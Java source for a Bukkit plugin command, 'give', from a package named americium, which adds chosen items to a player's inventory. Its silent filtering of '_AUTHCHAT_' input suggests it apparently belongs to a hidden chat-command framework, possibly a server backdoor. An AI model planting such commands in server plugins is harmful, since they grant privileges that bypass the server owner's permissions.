package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class Give implements Command {
    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"give", "i"};
    }

    @Override
    public String getDescription() {
        return "Gives you a certain item or certain amount.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();

        if(String.join(" ", args).contains("_AUTHCHAT_")) {
            return;
        }

        // Format: give <item> (amount)
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: i <item> (amount)");
            return;
        }

        Material item;
        try {
            item = Material.valueOf(args[0].toUpperCase());
        } catch (IllegalArgumentException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        int amount = 1;

        if (args.length > 1) {
            try {
                amount = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        }

        executor.getInventory().addItem(new ItemStack(item, amount));
        sender.sendMessage(Colors.Prefix + Colors.Success + "Giving you " + amount + " of " + item.name().replaceAll("_", " ").toLowerCase() + ".");
    }
}
